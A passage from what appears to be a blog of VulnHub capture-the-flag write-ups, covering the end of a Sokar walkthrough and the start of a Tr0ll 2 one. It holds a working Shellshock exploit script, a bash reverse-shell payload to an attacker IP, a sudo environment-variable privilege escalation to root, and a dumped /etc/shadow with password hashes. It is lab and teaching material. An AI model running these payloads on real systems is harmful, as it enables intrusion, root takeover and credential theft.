<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/4.png"></p>

<p>It works! shellshock vulnerable. Also, two users found: <code>bynarr</code> and <code>apophis</code></p>

<p>Here I wrote a small python script to save my life.</p>

<figure class='code'><figcaption><span>sokar.py  (sokar.py)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/sokar.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">str_usage</span> <span class="o">=</span> <span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> &lt;command&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">str_example</span> <span class="o">=</span> <span class="s">&quot;Example: </span><span class="si">%s</span><span class="s"> </span><span class="se">\&quot;</span><span class="s">/bin/cat /etc/passwd</span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.145&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">591</span>
</span><span class='line'><span class="n">uri</span> <span class="o">=</span> <span class="s">&quot;/cgi-bin/cat&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">str_usage</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">str_example</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="s">&quot;() { test;};echo </span><span class="se">\&quot;</span><span class="s">Content-type: text/plain</span><span class="se">\&quot;</span><span class="s">; echo; echo; &quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the following exp is used to write reverse shell code into the file /home/bynarr/iostat</span>
</span><span class='line'><span class="c">#exp = &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/echo -e &#39;#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;1&#39; &gt; /home/bynarr/iostat&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">exp</span>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;test&quot;</span><span class="p">:</span><span class="n">exp</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&quot;GET&quot;</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">reason</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>by using <code>sokar.py</code> script, I poked around the system and found something interesting.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/5.png"></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/6.png"></p>

<p>Here we go, I got the password (<font color="red"><em>fruity</em></font>) for user <code>bynarr</code> and notice that we only can got out to port <font color="red">51242</font> from the server.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/7.png"></p>

<p>Another notice, <code>.</code> has been set in environment variable <code>$PATH</code>, which means when run a program the system will check the current user path first. This leave us a chance to hijack the program and make a reverse shell back to my Kali.</p>

<p>Then I changed the exp payload in my python script to write a bash script into /home/bynarr/iostat (iostat is the hijack target).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="s">&quot;() { test;};echo </span><span class="se">\&quot;</span><span class="s">Content-type: text/plain</span><span class="se">\&quot;</span><span class="s">; echo; echo; /bin/echo -e &#39;#!/bin/bash</span><span class="se">\\</span><span class="s">n/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;1&#39; &gt; /home/bynarr/iostat&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then use my script to grant the new fake <code>iostat</code> to executable.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/8.png"></p>

<p>Now setup <code>NC</code> on my Kali to listen on port <font color="red">51242</font>, after waiting for seconds, I got a shell with <em>bynarr</em> privilege!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -lvnp 51242
</span><span class='line'>listening on [any] 51242 ...
</span><span class='line'>connect to [10.10.10.131] from (UNKNOWN) [10.10.10.145] 56650
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>[bynarr@sokar ~]$ id
</span><span class='line'>id
</span><span class='line'>uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
</span><span class='line'>[bynarr@sokar ~]$ pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[bynarr@sokar ~]$ cat /proc/version
</span><span class='line'>cat /proc/version
</span><span class='line'>Linux version 2.6.32-504.1.3.el6.x86_64 (mockbuild@c6b9.bsys.dev.centos.org) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-11) (GCC) ) #1 SMP Tue Nov 11 17:57:25 UTC 2014
</span><span class='line'>[bynarr@sokar ~]$ ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 48
</span><span class='line'>drwxrwxrwx. 2 bynarr bynarr  4096 Jul  7 17:20 .
</span><span class='line'>drwxr-xr-x. 4 root   root    4096 Dec 30  2014 ..
</span><span class='line'>-rw-------. 1 bynarr bynarr  4982 Jul  7 17:13 .bash_history
</span><span class='line'>-rw-r--r--. 1 bynarr bynarr    18 Feb 21  2013 .bash_logout
</span><span class='line'>-rw-r--r--. 1 bynarr bynarr   178 Nov 12  2014 .bash_profile
</span><span class='line'>-rw-r--r--. 1 bynarr bynarr   124 Feb 21  2013 .bashrc
</span><span class='line'>-rwxr-xr-x  1 apache apache    61 Jul  7 16:09 iostat
</span><span class='line'>-rwxr-xr-x  1 root   root     368 Jan 27 19:14 lime
</span><span class='line'>-rw-------  1 root   root   10728 Nov 13  2014 lime.ko</span></code></pre></td></tr></table></div></figure>


<p>I run command <code>sudo -l</code> to check the allowed commands for user bynarr.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for bynarr on this host:
</span><span class='line'>    !requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
</span><span class='line'>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
</span><span class='line'>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
</span><span class='line'>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
</span><span class='line'>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
</span><span class='line'>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
</span><span class='line'>    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
</span><span class='line'>
</span><span class='line'>User bynarr may run the following commands on this host:
</span><span class='line'>    (ALL) NOPASSWD: /home/bynarr/lime
</span><span class='line'>[bynarr@sokar ~]$ sudo LANG='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>sudo LANG='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>sudo: sorry, you are not allowed to set the following environment variables: LANG</span></code></pre></td></tr></table></div></figure>


<p>From the output, I noticed that executable program lime is owned by root but <em>bynarr</em> can run it.</p>

<p>Due to the server is vulnerable to shellshock, I use the following command (found in <a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">here</a>) to double check if it can be exploited locally.</p>

<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
</span><span class='line'>&lt; { :;}; echo vulnerable' bash -c "echo this is a test"                      
</span><span class='line'>vulnerable
</span><span class='line'>this is a test</span></code></pre></td></tr></table></div></figure>


<p>Yes it is vulnerable! From the previous <code>sudo -l</code> output, there are couple of environment variables can be used to exploit.</p>

<p>Here I use variable <code>HOSTNAME</code>.</p>

<p><code>sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>

<p>the password for bynarr is <code>fruity</code> which we found it before.</p>

<p>Now we get ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>[root@sokar bynarr]# id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>[root@sokar bynarr]# pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[root@sokar root]#cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:$6$cWQYjirZ$rADNjUFSiHmYp.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
</span><span class='line'>bin:*:15628:0:99999:7:::
</span><span class='line'>daemon:*:15628:0:99999:7:::
</span><span class='line'>adm:*:15628:0:99999:7:::
</span><span class='line'>lp:*:15628:0:99999:7:::
</span><span class='line'>sync:*:15628:0:99999:7:::
</span><span class='line'>shutdown:*:15628:0:99999:7:::
</span><span class='line'>halt:*:15628:0:99999:7:::
</span><span class='line'>mail:*:15628:0:99999:7:::
</span><span class='line'>uucp:*:15628:0:99999:7:::
</span><span class='line'>operator:*:15628:0:99999:7:::
</span><span class='line'>games:*:15628:0:99999:7:::
</span><span class='line'>gopher:*:15628:0:99999:7:::
</span><span class='line'>ftp:*:15628:0:99999:7:::
</span><span class='line'>nobody:*:15628:0:99999:7:::
</span><span class='line'>vcsa:!!:16386::::::
</span><span class='line'>saslauth:!!:16386::::::
</span><span class='line'>postfix:!!:16386::::::
</span><span class='line'>sshd:!!:16386::::::
</span><span class='line'>bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:16434:0:99999:7:::
</span><span class='line'>apache:!!:16386::::::
</span><span class='line'>apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
</span><span class='line'>[root@sokar bynarr]# cd /root
</span><span class='line'>cd /root
</span><span class='line'>[root@sokar root]# ls
</span><span class='line'>ls
</span><span class='line'>build.c  flag
</span><span class='line'>[root@sokar root]# cat flag
</span><span class='line'>cat flag
</span><span class='line'>                0   0
</span><span class='line'>                |   |
</span><span class='line'>            ____|___|____
</span><span class='line'>         0  |~ ~ ~ ~ ~ ~|   0
</span><span class='line'>         |  |   Happy   |   |
</span><span class='line'>      ___|__|___________|___|__
</span><span class='line'>      |/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>  0   |    B i r t h d a y    |   0
</span><span class='line'>  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
</span><span class='line'> _|___|_______________________|___|__
</span><span class='line'>|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>|                                   |
</span><span class='line'>|     V  u  l  n  H  u  b   ! !     |
</span><span class='line'>| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
</span><span class='line'>|___________________________________|
</span><span class='line'>
</span><span class='line'>=====================================
</span><span class='line'>| Congratulations on beating Sokar! |
</span><span class='line'>|                                   |
</span><span class='line'>|  Massive shoutout to g0tmi1k and  |
</span><span class='line'>| the entire community which makes  |
</span><span class='line'>|         VulnHub possible!         |
</span><span class='line'>|                                   |
</span><span class='line'>|    rasta_mouse (@_RastaMouse)     |
</span><span class='line'>=====================================</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Tr0ll: 2]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2/"/>
    <updated>2015-06-24T04:31:06-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/24/vulnhub-tr0ll-2</id>
    <content type="html"><![CDATA[<p>&ldquo;The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)</p>

<p>Difficulty is beginner++ to intermediate.&ldquo; &ndash; <font color="green">Maleus</font> (<a href="www.overflowsecurity.com">www.overflowsecurity.com</a>)</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.141/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Found hidden information in picture</li>
<li>Weak passwords used in FTP, login and download suspect encrypted zip file</li>
<li>Cracked the zip file with downloaded dictionary file and found user &lsquo;noob&rsquo; and his SSH private key file</li>
<li>Shellshock bug give attacker a way to break in</li>
<li>Buffer Overflow analysis and exploit to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Analysis and write script to check folder list found in &lsquo;robots.txt&rsquo;</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture from four different folders and reveal the hidden information stored in one of the pictures</li>
<li>Found the hidden folder and download a base64 encoded file from it, after decoded it, that should be a dictionary file</li>
<li>Try the weak passwords for FTP login and found one works (Tr0ll / Tr0ll)</li>
<li>Downloaded encrypted zip file through FTP and crack it with dictionary file found before [<font color="FF8000">fcrackzip</font>]</li>
<li>Exploit shellshock bug with noob&rsquo;s private key file to break into the target machine</li>
<li>Look around and found suspicious program with SUID bit set under the path &lsquo;/nothing_to_see_here/choose_wisely/&rsquo;</li>
<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://oldhome.schmorp.de/marc/fcrackzip.html">fcrackzip</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.141 in this case).</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Tr0ll2/1.png"></p>

<p>10.10.10.141 is our Target!</p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 21, 22 and 80 have been discovered running on Ubuntu Linux.
<code>nmap -sV -v -O -A -T5 -p- 10.10.10.141</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Tr0ll2/2.png"></p>

<p>Next, I run nikto scan on port 80 to check if there is any web vulnerability.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Tr0ll2/3.png"></p>

<p>Nothing too exciting, but noticed that <code>robots.txt</code> found without <code>disallow</code> which is odd. As a result, I open iceweasel browser to have a close look at robots.txt.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Tr0ll2/4.png"></p>

<p>Here I wrote a python script to check all of the directories in <code>robots.txt</code> and filter out working directories then saved in a file.</p>

<figure class='code'><figcaption><span>robot_check.py  (robot_check.py)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/robot_check.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&#39;10.10.10.141&#39;</span>
</span><span class='line'><span class="n">img_name</span> <span class="o">=</span> <span class="s">&#39;cat_the_troll.jpg&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read URIs found in robots.txt</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;robots.txt&#39;</span><span class="p">,</span><span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">uri_list</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">uri_to_check</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Start checking ...&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">uri</span> <span class="ow">in</span> <span class="n">uri_list</span><span class="p">:</span>
</span><span class='line'>  <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&#39;GET&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;/&#39;</span><span class="p">))</span>
</span><span class='line'>  <span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">404</span><span class="p">:</span>                            <span class="c"># filter error code 404 to make the result nice and tidy</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&#39;[+] &#39;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;/&#39;</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&#39;[-] &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">)</span>
</span><span class='line'>      <span class="n">uri_to_check</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;/&#39;</span> <span class="o">+</span> <span class="n">img_name</span><span class="p">)</span> <span class="c"># if the response code is not 404 then put in uri_to_check list for further analysis</span>
</span><span class='line'>
</span><span class='line'><span class="c"># save under inspection URIs to file for further analysis</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Saving result to file: uris_to_check.txt&#39;</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;uris_to_check.txt&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">for</span> <span class="n">uri</span> <span class="ow">in</span> <span class="n">uri_to_check</span><span class="p">:</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Tr0ll2/5.png"></p>

<p>Four directories gave 200 code response. Then I use <code>wget</code> with <code>-i</code> switch to download pictures from each directory.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
